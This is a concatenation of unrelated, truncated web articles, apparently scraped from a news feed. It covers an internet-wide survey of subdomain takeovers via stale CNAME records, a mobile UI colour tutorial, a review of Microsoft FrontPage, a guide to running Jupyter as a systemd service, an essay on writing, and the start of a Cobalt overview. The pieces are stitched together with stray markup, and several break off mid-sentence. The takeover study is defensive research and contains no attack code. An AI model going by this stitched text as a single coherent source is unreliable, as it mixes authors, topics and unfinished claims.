<p><br>At RedHunt Labs, we regularly perform various internet-wide studies under <strong><a rel="noreferrer noopener" href="https://redhuntlabs.com/blog/project-resonance-wave-0.html" data-type="URL" data-id="https://redhuntlabs.com/blog/project-resonance-wave-0.html" target="_blank">Project Resonance</a></strong>, to keep up with ever-changing cyberspace as well as to enrich our product <a rel="noreferrer noopener" href="https://redhuntlabs.com/nvadr" data-type="URL" data-id="https://redhuntlabs.com/nvadr" target="_blank"><strong>NVADR</strong></a>. This blog post is about one of our recent studies related to misconfigured CNAME records that can cause subdomain takeovers on a massive scale.</p>



<h3>Introduction to Subdomain Takeover</h3>



<p>DNS is the backbone of the internet. It is often called the internet’s phone book as it maps human-perceivable domain names to IP addresses that computers understand. Without DNS, there wouldn’t be online websites that can be remembered. There’s no google.com, twitter.com, or redhuntlabs.com, just a weird sequence of numbers.</p>



<p>A domain can be pointed to an IP address or another domain/host using DNS records such as A, CNAME, DNAME, etc. A domain/subdomain cannot be taken over, when both the DNS record and the resource it points to (IP or another domain), is under control. If the owner of the domain loses ownership of the resource the DNS record points to, the resource itself might become claimable.</p>



<p>Here are a few <strong><a rel="noreferrer noopener" href="https://www.hackerone.com/hacktivity" data-type="URL" data-id="https://www.hackerone.com/hacktivity" target="_blank">HackerOne</a></strong> reports showing how attackers claimed the resources pointed by stale DNS records of famous companies. <strong><a rel="noreferrer noopener" href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover" target="_blank">Searching</a><a href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover"> for it on HackerOne</a> </strong>gives 100+ such reports. Few reports show how attackers were able to exploit / bypass other web app functionalities with the help of this vulnerability.</p>







<h3>How does it work?</h3>



<p>Let’s say a developer wants to create a web app for his newly created organization. A decade ago, this process would be something similar to this: buy/lease an IP address, host your website on the server and point the DNS record to this IP. This process remained the same even if you wanted to host a static website or a landing page.</p>



<p>With the increase of Cloud and other SaaS services, now all the developer needs to do is use a service to host the website and point the DNS record to the resource. For example, at Heroku, such a domain/subdomain would take the form “<em>newproject.herokuapp.com”</em>. The developer will ultimately want the web app to appear to be hosted on a domain/subdomain (say, <em>app.neworg.com</em>) of his own organization’s domain. Therefore, he makes use of a CNAME record which is configured to forward all queries to his organization’s subdomain, i.e. <em>app.neworg.com</em>, to the cloud provider’s subdomain, <em>newproject.herokuapp.com</em>, where the web app is hosted.</p>

<p>Now the potential for a subdomain takeover occurs when the webpage hosted at the cloud provider is deleted but the DNS entry is retained. The attacker simply now re-registers the host at the cloud provider, adds the organization’s subdomain as an alias, and thus controls what content is hosted. Since the stale CNAME records originally have not been removed, <em>app.neworg.com </em>starts serving the attacker-controlled content.</p>



<p>In a similar way, another variant is known as “second-order subdomain takeovers” or more popularly, “<a rel="noreferrer noopener" href="https://edoverflow.com/2017/broken-link-hijacking/" target="_blank"><strong>broken-link hijacking</strong></a>” occurs when the potentially vulnerable subdomains are used to serve content on the target’s website but they do not necessarily belong to the target. This means that the resource is being served on the webpage, for example, via a blob of JavaScript, and the attacker can claim the subdomain from which the resource is being imported. Second-order takeovers usually have a lesser impact than the earlier, but still pose a significant threat from an organization’s perspective.</p>



<h3>What we did.</h3>



<p>Our motivation was to perform a survey and analyze the status quo of vulnerable domains/subdomains in the present cyberspace. We conducted an internet-wide survey consisting of approximately 220 million hosts collected by our thousands of bots collecting various kinds of asset information from all over the internet. A database was created which contained CNAME records and related fingerprints of several vulnerable platforms, many of which we ingeniously studied to see if they can be taken over (if added as a service) as well as picked some of them that are already known to be vulnerable.</p>



<p>An automation setup was designed to effectively perform the task of checking whether the domains/subdomains were vulnerable to takeover. </p>

<p>The entire setup consisted of mainly 3 components:</p>



<ul><li><strong>DNS Resolving</strong>: This component was mainly entitled to the task of mass resolving domains to their CNAME records by making DNS queries. It took input from the input-queue consisting of domains/subdomains and generated an output compatible with the HTTP component.</li><li><strong>HTTP Response Grabbing</strong>: The output from the DNS resolving entity was fed into this element, which did with the task of making mass HTTP queries to the domains and look for potential takeovers.</li><li><strong>Filtering &amp; Analysis</strong>: This component took the load of filtering out false positives from the results obtained through several layers before flagging a domain as vulnerable. This constituent also performed an analysis of the data obtained.</li></ul>



<p>The system was designed to intelligently detect possible takeovers while handling all kinds of exceptions and keeping in mind other complications of the HTTP protocol. The tool was also suited to follow the pattern of the database which was created. The flowchart below defines the overall logic around which the tool functioned:</p>

<p>Taking a deep dive at the statistics generated by our research, surprised us by the massive numbers. The first thing that came to our notice was the fact a total of 33 services that (unintentionally) allowed for potential subdomain takeovers, were identified. Interestingly, a large percent (62%) of vulnerable DNS records pointed to Shopify. This also indicates that most of the vulnerable domains belonged to the E-commerce industry, signifying that e-commerce still remains largely affected by security issues.&nbsp;</p>

<p>In the other half of results, Unbounce (landing pages creator) ranked second highest in the vulnerable share consuming about 14% of vulnerable domains, followed by Heroku (9%), GitHub Pages (4%), Bigcartel (2%), Tumblr (1%), Webflow (1%) and Pantheon (1%). The remainder 20% of the shares consisted mostly of WordPress, Surge.sh, AWS, etc, with HelpJuice comprising the least of the shares (just 15 takeovers).</p>



<p>Diving deeper into the results obtained, our first and foremost observation was that amongst Alexa Top 1000 domains, we identified 139 possible takeovers. </p>



<figure><blockquote><p>Overall, we identified a total of 424,120 subdomains had misconfigured CNAME records, and were prone to take over across the internet. It simply means that organizations still have a huge number of assets (subdomains, in this case) which are untracked and hence potentially vulnerable to subdomain takeover. </p></blockquote></figure>

<p>A very significant pattern which we observed was that interestingly the most common vulnerable subdomain was&nbsp; <em>”www”</em>, which means most of the stale records pointed to the “home subdomain” of the sites. The next popular subdomain name was <em>“shop”</em>, followed by <em>“store”</em> and <em>“blog”</em>.</p>



<figure><blockquote><p>Since Chrome 69, Google has decided to strip the “www” and “m” subdomains from the URL displayed in the browser’s address bar. So if such a subdomain get compromised, for a normal user, it becomes quite difficult to figure out that it might be browsing attacker-controlled content.</p></blockquote></figure>







<p>Analyzing all the domains within our database, we also found ~200 non-functional <em>.gov</em> site subdomains prone to takeover. An extremely mind-boggling observation here was that one of the domains had implemented a wildcard CNAME record, and the service to which it was pointing was non-existent (i.e. claimable). <em>The security impact of such a case is beyond comprehension because a wildcard CNAME entry implies that *.site.tld will resolve, signifying that once the service has been taken over, not only the existing ones but non-existent subdomains of the site will also resolve to the attacker-controlled service.</em></p>



<p>We also observed that several (around ~1K) subdomains were <em>.edu</em> sites that were vulnerable to takeover. Unbounce and Pantheon were among the top popular vulnerable services within the <em>.edu</em> domains. The results included subdomains from a lot of prestigious universities. This also sheds some light on the kind of infrastructure that some of the top educational sites use.&nbsp;</p>

<p>On the other hand, healthcare, wellness, and fitness sites too consumed a significant share of the vulnerable subdomains (around ~5K). In this case, Unbounce and Strikingly took the top places in vulnerable services. A worth noting point in this section is the diverse set of results that had been harvested, which ranged from sellers of pharmaceutical items to online consultancy services, from fitness centers to healthcare gear distributors, denoting that all of them were significantly affected by security issues.&nbsp;</p>



<p>The sports and gaming section too had around ~4K takeovers while the entertainment sector consumed a minor share (around 500). Similar to the health sector, this too affected a wide range of offerings, from several video game retailers to sport-specific training providers. The list is long and we can continue reading from our insights but we just decided to focus on the major ones for now.</p>



<h3>Implications of a takeover.</h3>



<p>Following an attacker’s perspective, such takeovers can be abused in several ways:</p>



<ul><li>Since a subdomain represents a part of the organization, a subdomain takeover can allow an attacker to serve malicious content or misguiding information and thus cause Brand Reputation loss, User Distrust and Negative PR.</li><li>It has <strong><a href="https://whitehatnepal.tumblr.com/post/149985438982/how-i-was-able-to-read-uber-logs-and-internal" target="_blank" rel="noreferrer noopener">previously come to light</a></strong> that internal emails can be actively intercepted just by claiming a simple webhook of the third-party service (e.g. <em>Sendgrid</em>) which an application might be using for email marketing.&nbsp;</li><li>OAuth whitelisting of a vulnerable subdomain might be a cause of trouble, because an attacker can …</li></ul></div></div>

November 18, 2020 | http://amortizedcost.net/ui-desing-for-software-developer-part-1/ | <a href="https://web.archive.org/web/*/http://amortizedcost.net/ui-desing-for-software-developer-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>In this series of articles, I will show full process of creating a UI design for <a href="https://play.google.com/store/apps/details?id=net.amortizedcost.batchimageshrinker">Batch Image Shrinker</a> (<a href="market://details?id=net.amortizedcost.batchimageshrinker">Google play link</a>) mobile application which I did by myself. As a software developer always I've been thinking that UI design is not for me, that it's complex and requires some art skill or something.</p>
<p>It's a myth and I will try to debunk it.</p>
<p>I will show you that UI design is for everyone, you just need to know some basic technics and a couple of tricks.</p>
<p>It's not going to be easy, but I promise you it will be very interesting.</p>
<h2 id="dominatingcolor">Dominating color</h2>
<p>With the dominating presence of dark-mode, I noticed that for me it was easier to work with darker colors as baseline colors than with brighter ones, and since  I almost always use dark-mode of the applications, so I wanted to have something similar in my application. I was certain that I didn't want to use <a href="https://colornames.org/color/3b5998">Facebook blue</a> color and it's successors, so I had to find something more futuristic and brave than that. My choice fell on <code>#464d77</code> which is a very intense dark blue, almost purple color.</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-17-at-20.10.09.png" alt="Screenshot-2020-11-17-at-20.10.09"></p>
<p>Common advice here will be not to use pure black or white colors, which, as perfectly described in <a href="https://ianstormtaylor.com/design-tip-never-use-black/">the article</a>, hardly present in the real-world color pallet. <em>What a coincidence, I found <a href="https://lawsofux.com/aesthetic-usability-effect.html">a website</a> with a perfect example of dark background color and great content to read.</em></p>
<h2 id="colorpalette">Color palette</h2>
<p>Of cause, just one baseline color will not be enough to build a feature-rich application. You will need a couple of colors for different types of components like buttons, checkboxes, radio buttons, etc. Another one or two colors will be needed for the text itself. Also,  some gradients for several states of a component, such as "active", "disabled", "pressed". So before creating an actual UI, we will need to have a rich pallet of colors to work with. In my case, I ended up with 6 colors in total which was more than enough to create a simple yet interesting UI.</p>
<p>This step is much easier than the previous one, because here we will be either reusing or generating new color pallets using the baseline color from the previous part.</p>
<p>The generator which I was using is <a href="https://coolors.co/palettes/popular/f9db6d">this</a>. Here you could either put the color hex into a search bar or simply choose the pallet from the <a href="https://coolors.co/a1e8af-94c595-747c92-372772-3a2449">hundreds</a> of pre-generated ones. If the color range is not enough for you, try to extend it with <a href="https://learnui.design/tools/data-color-picker.html#palette">another</a> good palette generator. Put on the left side the baseline color and select how many colors you will need.</p>
<p>Pro-tip, you can combine those tools to get even more combinations. As you can see here, I was using a baseline color on the right side and colors from <a href="https://coolors.co/464d77-36827f-f9db6d-f4eded-877666">the palette</a> as values for the right side of the generator:</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.50.31.png" alt="Screenshot-2020-11-16-at-23.50.31"><br>
<img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.51.04.png" alt="Screenshot-2020-11-16-at-23.51.04"></p>
<p>If you are not satisfied with the results try to get back to choosing the baseline color and repeat the whole process again. Since we are learning it's ok to do multiple roundtrips until your gut feelings tell you that that is it.</p>
<p>Once we are done with the color schema we are good to go to we move to the next step - choosing fonts, which will be covered next time.</p>

	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

    <p><img src="https://janakiev.com/assets/jupyter_systemd_files/Activiteit_in_de_controle_kamer_in_de_Tap-Line_olie_terminal_nabij_Saida,_Bestanddeelnr_255-6308.jpg"></p>
  <p><span>10 Nov 2020</span></p><p>In this article you will see how to easily manage <a href="https://jupyter.org/">Jupyter</a> Notebook and <a href="https://jupyterlab.readthedocs.io/en/stable/">JupyterLab</a> by using the <a href="https://janakiev.com/blog/jupyter-systemd/systemd.io">Systemd</a> tooling. This is useful when you want to have an instance running local or on your server that you can manage and monitor.</p>

<p>What is Systemd and why do we need it? Systemd is an <a href="https://en.wikipedia.org/wiki/Init">init</a> system in Linux used for system intialization and service management. This allows services configured for Systemd to manage and monitor them. This way, you can check if the service is still running, you can set it to automatically restart, you monitor the outputs of the service, and much more. To add Jupyter as a service we have to create a unit file. Let’s have a look how that works.</p>



<p>Systemd uses unit files as its primary way to manage and configure system resources. These files are in the <a href="https://en.wikipedia.org/wiki/INI_file">INI</a> file format and are stored in <code>/etc/systemd/system</code>.</p>

<p>But before we start, we have to configure a password for Jupyter. Typically when running Jupyter, it would open a window in your browser with a generated token. In this case it will run in the background as a service and you would need to use a password. This can be done by generating hashed password and salt for use in notebook configuration with:</p>

<div><div><pre><code>python <span>-c</span> <span>"from IPython.lib.security import passwd; print(passwd('PASS'))"</span>
</code></pre></div></div>

<p>Which should give you a hash like this one:</p>

<div><div><pre><code>sha1:137775e93d29:ba64d3b78e089f0f779167242ddb080a05c42a84
</code></pre></div></div>

<p>For more information on security, have a read on <a href="https://jupyter-notebook.readthedocs.io/en/stable/security.html">Security in the Jupyter notebook server</a>. Great, now let’s continue to create a file with the name <code>jupyter.service</code> with the following contents:</p>

<div><div><pre><code><span>[Unit]</span>
<span>Description</span><span>=</span><span>Jupyter Notebook</span>

<span>[Service]</span>
<span>Type</span><span>=</span><span>simple</span>
<span>PIDFile</span><span>=</span><span>/run/jupyter.pid</span>
<span>ExecStart</span><span>=</span><span>/home/user/anaconda3/bin/python -m jupyter-lab --notebook-dir=/home/user/notebooks --no-browser --NotebookApp.password='sha1:137775e93d29:ba64d3b78e089f0f779167242ddb080a05c42a84'</span>
<span>User</span><span>=</span><span>user</span>
<span>Group</span><span>=</span><span>user</span>
<span>Restart</span><span>=</span><span>always</span>
<span>RestartSec</span><span>=</span><span>10</span>

<span>[Install]</span>
<span>WantedBy</span><span>=</span><span>multi-user.target</span>
</code></pre></div></div>

<p>Each file has a few sections and each section like <code>[Unit]</code>, <code>[Service]</code>, and <code>[Install]</code> have various <a href="https://www.freedesktop.org/software/systemd/man/systemd.directives.html">directives</a> that are used to configure a service. Most of them should already give a hint on what they are used for, but we will quickly go through some of them. To read more into detail how this works have a look at the tutorial <a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files">Understanding Systemd Units and Unit Files</a>.</p>

<p>The most important one here is the <code>ExecStart=</code> directive, which specifies the command to be run. It is important to note, that only absolute paths should be used and that the <code>ExecStart=</code> directive has to be written in one line. In this case the unit files uses JupyterLab that is installed in the Anaconda base environment. If you use virtualenv instead, change the directive for <code>ExecStart=</code> to:</p>

<div><div><pre><code><span>ExecStart</span><span>=</span>/bin/bash <span>-f</span> <span>"source /home/user/notebooks/bin/activate; jupyter-lab --notebook-dir=/home/user/notebooks"</span>
</code></pre></div></div>

<p>The <code>PIDFile=</code> directive specifies where the process identification number is stored. Make sure to have your user and group in the <code>User=</code> and <code>Group=</code> directives. The <code>Restart=</code> directive specifies if the service should be restarted when the service exits, is killed or a timeout is reached. <code>RestartSec=</code> specifies how long it should wait until the service will be then restarted.  You can read more about the directives in the <a href="https://www.freedesktop.org/software/systemd/man/systemd.directives.html">documentation</a>.</p>

<p>If you use more configuration and want to have it in a bash script instead, you can create a script like the following:</p>

<div><div><pre><code><span>#!/bin/bash</span>
/home/nikolai/anaconda3/bin/jupyter-lab <span>\</span>
  <span>--notebook-dir</span><span>=</span>/home/user/notebooks <span>\</span>
  <span>--ip</span><span>=</span><span>'*'</span> <span>\</span>
  <span>--port</span><span>=</span>8888 <span>\</span>
  <span>--NotebookApp</span>.token<span>=</span><span>''</span> <span>\</span>
  <span>--NotebookApp</span>.password<span>=</span><span>'sha1:137...'</span> <span>\</span>
  <span>--no-browser</span>
</code></pre></div></div>

<p>Then, replace the previous <code>ExecStart</code> with <code>ExecStart=/path/to/script.sh</code> in the unit file. Also, make sure to make it executable with <code>chmod +x /path/to/script.sh</code>.</p>

<p>Finally, instead of using the argument <code>--notebook-dir</code>, you can specify the working directory by using the <code>WorkingDirectory=</code> directive.</p>



<p>First, move the unit file to <code>/etc/systemd/system/</code> with:</p>

<div><div><pre><code><span>sudo mv </span>jupyter.service /etc/systemd/system/
</code></pre></div></div>

<p>Then, reload the systemd manager configuration with:</p>

<div><div><pre><code><span>sudo </span>systemctl daemon-reload
</code></pre></div></div>

<p>Next, enable the service to start at boot with:</p>

<div><div><pre><code><span>sudo </span>systemctl <span>enable </span>jupyter
</code></pre></div></div>

<p>To start the Jupyter service, you need to type:</p>

<div><div><pre><code><span>sudo </span>systemctl start jupyter
</code></pre></div></div>

<p>To check its status, you can type:</p>

<div><div><pre><code><span>sudo </span>systemctl status jupyter
</code></pre></div></div>

<p>Finally, you can monitor the outputs of the service with <code>sudo journalctl -u jupyter -f</code>. To show the log messages since the last boot (<code>-b</code>) and without additional fields like timestamp and hostname (<code>-o cat</code>), type:</p>

<div><div><pre><code><span>sudo </span>journalctl <span>-u</span> jupyter <span>-b</span> <span>-o</span> <span>cat</span> <span>-f</span>
</code></pre></div></div>

<p>This should show you a similar output to the following output:</p>

<div><div><pre><code>Started Jupyter Notebook.
[I 18:54:36.878 LabApp] JupyterLab extension loaded from /home/user/anaconda3/lib/python3.7/site-packages/jupyterlab
[I 18:54:36.879 LabApp] JupyterLab application directory is /home/user/anaconda3/share/jupyter/lab
[I 18:54:36.880 LabApp] Serving notebooks from local directory: /home/user/notebooks
[I 18:54:36.880 LabApp] The Jupyter Notebook is running at:
[I 18:54:36.880 LabApp] http://0.0.0.0:8888/
</code></pre></div></div>

<p>This really useful if you need to have a look at what Jupyter logs out since some errors and logs are not visible within the notebooks. For more useful commands and arguments have a look at this <a href="https://janakiev.com/blog/systemd-cheatsheet/">Systemd cheatsheet</a>.</p>



<p>Now, you should be able to manage and monitor your Jupyter service with Systemd. To learn how to install and configure Jupyter on a server including SSL/TLS, have a look at my previous guide on <a href="https://janakiev.com/blog/jupyter-notebook-server/">Installing and Running Jupyter Notebooks on a Server</a>  Here are a few further resources when working with systemd:</p>

        <p>No one should really like job titles.&nbsp;</p>
<p>They can limit an <em>executive</em>’s ability to seize opportunities outside their supposed responsibilities. Awarding one could possibly stunt a person’s desire to continue doing the work that got them there in the first place. Worst of all, their often inflated nature makes people who have special-sounding ones believe that status-signalling is meaningful.</p>
<p>And yet, if you want your work to be significantly better  -  it is time for you to take on another job title.&nbsp;</p>
<p><strong>Writer.</strong></p>
<p>In my current position, my job title is ‘VP of Product’  -  but despite this fancy-sounding title, my professional responsibilities and passion simply make me a product designer. I work primarily on crafting pleasurable and meaningful experiences for people through disciplines such as interaction and usability design, motion design, and high-fidelity prototyping. But if I were to give the most credit to anything for enabling me to produce my best work: it would be the skills I practice when I give myself the title of ‘Writer’.&nbsp;</p>
<p>When I write, I look at my work with the critical eye of a premier ballet teacher. <em>Stop attempting to say so much. Stop using so many unnecessary words. Stop trying to cram so many ideas into one sentence.</em> Writing freezes your ideas for refinement. You’re free to chop and eliminate. To cut down on saying things that don’t add much or that simply don’t need to be said. Its almost as though the simple act of putting words on paper detaches you entirely from your thinking. To meditate on your extensive ideas and prune them like a master bonsai craftsman: with precision and grace.&nbsp;</p>
<p>When I write, a desire for focus and simplicity stirs from within. I cut out well-worded paragraphs and rewrite entire articles. I refuse to settle with <em>impressive</em> as I demand <em>understandable</em>.&nbsp;</p>
<p>This desire pays great dividends to my main profession.&nbsp;</p>
<p>Don Norman, author of two of my favourite books: <a href="https://amzn.to/2G6vwv6" rel="noopener noreferrer" target="_blank"><em>The Design of Everyday Things</em></a> and <a href="https://amzn.to/3316d6y" rel="noopener noreferrer" target="_blank"><em>Emotional Design</em></a>, states that one of the keys to a great design is <strong>Discoverability</strong>. This means that a product allows the user to immediately <em>discover what actions are possible</em> and <em>where and how to perform them</em>.&nbsp;</p>
<p>For a long time, my digital product designs were a combination of anything and everything that had played a significant role in other successful products I studied. This ultimately resulted in overwhelming interfaces. Designs that did too much at once. Screens that forced the user to slow down but only to consider <em>how clever this app was.</em>&nbsp;</p>
<p>A simple and focused product makes the kind of discoverability that Don Norman talks about, easy. But when you’re trying to do everything, much like my clever designs attempted to do, it’s fairly difficult for your users to quickly discover the 1–2&nbsp;<em>important things</em> your product can do or help them achieve.</p>
<p>For your work to be world-class, it often just needs less. That’s true for my designs - and I only learnt that because it’s true for my writing. So add ‘Writer’ to your job title and do the work that goes along with being one. Write a lot. Edit more. Publish frequently. It’ll be hard and it will require many hard hours from you - but it will give anything you create the simplicity and focus that French mathematician Blaise Pascal wish he had, as he once professed: <em>“I’m sorry I wrote you such a long letter; I didn’t have time to write a short one.”</em></p>
<p>***</p>
<p>Don’t hesitate to say hello and so I can see your added job title on Twitter: <a href="https://twitter.com/JustinCampbellP" rel="noopener noreferrer" target="_blank">@justincampbellp</a></p>

<![CDATA[Cobalt – Lightweight Electron Alternative]]>

<br/>
November 18, 2020 | https://cobalt.foo/overview.html | <a href="https://web.archive.org/web/*/https://cobalt.foo/overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="centerCol">
      <div id="content">
        <p>Cobalt is a lightweight HTML5/CSS/JS application container that is designed
to provide a rich application development environment with minimal resource
consumption (deployment size, RAM, CPU, GPU). At the same time, Cobalt enables
a rich, low-latency user experience across a wide variety of platforms and
devices.</p>

<h4 id="target-audiences">Target audiences</h4>

<p>Cobalt's documentation is written with two audiences in mind:</p>

<ul>
